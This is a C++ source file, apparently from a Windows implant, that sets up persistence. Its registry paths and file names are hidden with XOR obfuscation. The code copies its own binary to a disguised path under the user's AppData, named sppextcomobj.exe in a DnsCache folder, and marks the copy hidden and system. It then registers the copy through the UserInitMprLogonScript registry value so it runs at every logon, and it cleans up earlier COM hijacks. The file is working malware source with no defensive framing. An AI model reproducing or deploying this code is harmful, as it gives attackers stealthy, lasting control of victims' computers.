#include "Persistence.h"
#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>

namespace persistence {

namespace {
    // Registry Paths & Names (Encrypted)
    // HKCU\Environment
    const wchar_t kEnvKeyEnc[] = { 'E'^0x4B, 'n'^0x1F, 'v'^0x8C, 'i'^0x3E, 'r'^0x4B, 'o'^0x1F, 'n'^0x8C, 'm'^0x3E, 'e'^0x4B, 'n'^0x1F, 't'^0x8C };
    // UserInitMprLogonScript
    const wchar_t kLogonScriptEnc[] = { 'U'^0x4B, 's'^0x1F, 'e'^0x8C, 'r'^0x3E, 'I'^0x4B, 'n'^0x1F, 'i'^0x8C, 't'^0x3E, 'M'^0x4B, 'p'^0x1F, 'r'^0x8C, 'L'^0x3E, 'o'^0x4B, 'g'^0x1F, 'o'^0x8C, 'n'^0x3E, 'S'^0x4B, 'c'^0x1F, 'r'^0x8C, 'i'^0x3E, 'p'^0x4B, 't'^0x1F };
    // Microsoft\Windows\DnsCache
    const wchar_t kSubDirEnc[] = { 'M'^0x4B, 'i'^0x1F, 'c'^0x8C, 'r'^0x3E, 'o'^0x4B, 's'^0x1F, 'o'^0x8C, 'f'^0x3E, 't'^0x4B, '\\'^0x1F, 'W'^0x8C, 'i'^0x3E, 'n'^0x4B, 'd'^0x1F, 'o'^0x8C, 'w'^0x3E, 's'^0x4B, '\\'^0x1F, 'D'^0x8C, 'n'^0x3E, 's'^0x4B, 'C'^0x1F, 'a'^0x8C, 'c'^0x3E, 'h'^0x4B, 'e'^0x1F };
    // sppextcomobj.exe
    const wchar_t kExeNameEnc[] = { 's'^0x4B, 'p'^0x1F, 'p'^0x8C, 'e'^0x3E, 'x'^0x4B, 't'^0x1F, 'c'^0x8C, 'o'^0x3E, 'm'^0x4B, 'o'^0x1F, 'b'^0x8C, 'j'^0x3E, '.'^0x4B, 'e'^0x1F, 'x'^0x8C, 'e'^0x3E };
    // {00021401-0000-0000-C000-000000000046} (Shell Link)
    const wchar_t kBadClsid1Enc[] = { '{'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '2'^0x4B, '1'^0x1F, '4'^0x8C, '0'^0x3E, '1'^0x4B, '-'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '-'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '-'^0x3E, 'C'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '-'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '4'^0x3E, '6'^0x4B, '}'^0x1F };
    // {21EC2020-3AEA-1069-A2DD-08002B30309D} (Work Folders)
    const wchar_t kBadClsid2Enc[] = { '{'^0x4B, '2'^0x1F, '1'^0x8C, 'E'^0x3E, 'C'^0x4B, '2'^0x1F, '0'^0x8C, '2'^0x3E, '0'^0x4B, '-'^0x1F, '3'^0x8C, 'A'^0x3E, 'E'^0x4B, 'A'^0x1F, '-'^0x8C, '1'^0x3E, '0'^0x4B, '6'^0x1F, '9'^0x8C, '-'^0x3E, 'A'^0x4B, '2'^0x1F, 'D'^0x8C, 'D'^0x3E, '-'^0x4B, '0'^0x1F, '8'^0x8C, '0'^0x3E, '0'^0x4B, '2'^0x1F, 'B'^0x8C, '3'^0x3E, '0'^0x4B, '3'^0x1F, '0'^0x8C, '9'^0x3E, 'D'^0x4B, '}'^0x1F };

    std::wstring GetPersistencePath() {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            return std::wstring(path) + L"\\" + utils::DecryptW(kSubDirEnc, 26) + L"\\" + utils::DecryptW(kExeNameEnc, 16);
        }
        return L"";
    }

    bool InstallLogonScript(const std::wstring& implantPath) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kEnvKeyEnc, 11).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::wstring valName = utils::DecryptW(kLogonScriptEnc, 22);
            LSTATUS status = RegSetValueExW(hKey, valName.c_str(), 0, REG_SZ, (LPBYTE)implantPath.c_str(), (DWORD)(implantPath.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return status == ERROR_SUCCESS;
        }
        return false;
    }
}

std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
    LOG_INFO("Establishing persistence...");

    // 1. Cleanup all previous bad hijacks to restore system stability
    std::wstring inproc = L"InprocServer32";
    std::wstring localSrv = L"LocalServer32";
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid1Enc, 38), inproc);
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, 38), localSrv);
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, 38), inproc);

    std::wstring targetPath = GetPersistencePath();
    if (targetPath.empty()) return L"";

    wchar_t currentPath[MAX_PATH];
    if (overrideSourcePath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) return L"";
    } else {
        wcscpy(currentPath, overrideSourcePath.c_str());
    }

    if (_wcsicmp(currentPath, targetPath.c_str()) != 0) {
        std::wstring dir = targetPath.substr(0, targetPath.find_last_of(L"\\"));

        // Create directories recursively
        size_t pos = 0;
        while ((pos = dir.find(L"\\", pos + 1)) != std::wstring::npos) {
            std::wstring sub = dir.substr(0, pos);
            CreateDirectoryW(sub.c_str(), NULL);
        }
        CreateDirectoryW(dir.c_str(), NULL);

        if (!CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
            LOG_ERR("Failed to copy binary to persistence path: " + utils::ws2s(targetPath));
        } else {
            SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    // Method: UserInitMprLogonScript (Very stealthy, triggers on logon)
    if (InstallLogonScript(targetPath)) {
        LOG_INFO("Logon Script persistence success.");
    }

    return targetPath;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
